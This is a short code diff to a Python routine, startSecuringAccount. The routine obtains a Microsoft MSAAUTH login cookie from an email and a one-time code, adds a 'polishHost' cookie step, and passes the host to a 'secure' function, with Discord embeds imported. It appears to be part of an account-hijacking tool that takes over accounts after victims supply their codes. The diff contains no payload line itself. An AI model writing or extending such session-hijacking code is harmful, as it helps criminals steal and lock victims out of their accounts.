@@ -1,6 +1,7 @@
 from views.utils.getMSAAUTH import getMSAAUTH
 
 from views.utils.securing.getLiveData import getLiveData
+from views.utils.securing.polishHost import polishHost
 from views.utils.securing.secure import secure
 
 from discord import Embed
@@ -18,6 +19,9 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         data,
         code
     )
+
+    print("[+] - Got Cookies! Polishing login cookie...")
+    host = await polishHost(session, msaauth)  
     
     if not msaauth:
         print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
@@ -25,7 +29,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     
     print("[+] - Got MSAAUTH | Starting to secure...")
     initialTime = time.time()
-    account = await secure(session)
+
+    account = await secure(session, host)
     print(account)
 
     finalTime = (time.time() - initialTime)
